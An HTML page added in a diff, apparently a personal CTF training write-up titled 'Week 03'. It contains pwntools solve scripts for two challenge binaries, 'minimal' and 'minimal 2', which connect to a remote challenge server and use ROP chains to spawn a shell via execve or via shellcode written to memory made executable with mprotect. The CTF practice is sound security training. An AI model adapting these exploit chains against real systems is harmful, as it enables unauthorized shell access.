@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>anomie0xff</title>
+    <link rel="stylesheet" href="https://anomie0xff.github.io/style.css">
+</head>
+
+<body>
+    <div class="header">
+        <h3><ul>
+            <li><a href="/">/anomie0xff</a></li>
+            <li><a href="/writeups">/writeups</a></li>
+            <li><a href="/pwn_bootcamp">/pwn_bootcamp</a></li>
+            <li><a href="/pwn_college">/pwn.college</a></li>
+        </ul></h3>
+    </div>
+    <section class="section">
+        <div class="container">
+            
+<h1 class="title">
+  Week 03
+</h1>
+
+<div class="page-content">
+<h1 id="minimal">minimal</h1>
+<p>Syscall to call execve(&quot;/bin/sh&quot;, 0, 0)</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">128.199.12.141</span><span>&quot;, </span><span style="color:#d08770;">7005</span><span>)
+</span><span>
+</span><span>elf = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">./minimal</span><span>&#39;)
+</span><span>
+</span><span>buf = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">8
+</span><span>
+</span><span>shell = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x402000</span><span>)
+</span><span>syscall = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401032</span><span>)
+</span><span>rax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x40100e</span><span>)
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401004</span><span>)
+</span><span>rsi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401006</span><span>)
+</span><span>rdx = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401008</span><span>)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(buf + rax + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">59</span><span>) + rdi + shell + rsi + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) + rdx + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) + syscall)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+<h1 id="minimal-2">minimal 2</h1>
+<p>Syscall to mprotect a region of memory to be rwx then syscall to read shellcode to it then jump to the shellcode</p>
+<p>Solve script:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span>
+</span><span>p = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">128.199.12.141</span><span>&quot;, </span><span style="color:#d08770;">7006</span><span>)
+</span><span style="color:#65737e;">#p = process(&#39;./minimal_2&#39;)
+</span><span style="color:#65737e;">#gdb.attach(p)
+</span><span>
+</span><span>elf = </span><span style="color:#bf616a;">ELF</span><span>(&#39;</span><span style="color:#a3be8c;">./minimal_2</span><span>&#39;)
+</span><span>context.arch = elf.arch
+</span><span>context.log_level = &#39;</span><span style="color:#a3be8c;">DEBUG</span><span>&#39;
+</span><span>
+</span><span>buf = </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;*</span><span style="color:#d08770;">8
+</span><span>shellcode = </span><span style="color:#bf616a;">asm</span><span>(shellcraft.</span><span style="color:#bf616a;">sh</span><span>())
+</span><span>
+</span><span>syscall = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401013</span><span>)
+</span><span>rax = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x40100e</span><span>)
+</span><span>rdi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401004</span><span>)
+</span><span>rsi = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401006</span><span>)
+</span><span>rdx = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401008</span><span>)
+</span><span>rbp = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x401017</span><span>)
+</span><span>code_addr = </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x400000</span><span>)
+</span><span>
+</span><span style="color:#65737e;"># mmap 0x400000 to be rwx
+</span><span>payload = buf + rax + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">10</span><span>) + rdi + code_addr + rsi + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x1000</span><span>) + rdx + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">7</span><span>) + syscall
+</span><span>
+</span><span style="color:#65737e;"># read shellcode to 0x400000
+</span><span>payload += rax + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) + rdi + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0</span><span>) + rsi + code_addr + rdx + </span><span style="color:#bf616a;">p64</span><span>(</span><span style="color:#d08770;">0x1000</span><span>) + syscall
+</span><span>
+</span><span style="color:#65737e;"># jump to shellcode
+</span><span>payload += code_addr
+</span><span>
+</span><span>
+</span><span style="color:#65737e;"># send payload then shellcode
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>p.</span><span style="color:#bf616a;">sendline</span><span>(shellcode)
+</span><span>
+</span><span>p.</span><span style="color:#bf616a;">interactive</span><span>()
+</span></code></pre>
+
+</div>
+
+        </div>
+    </section>
+</body>
+
+</html>
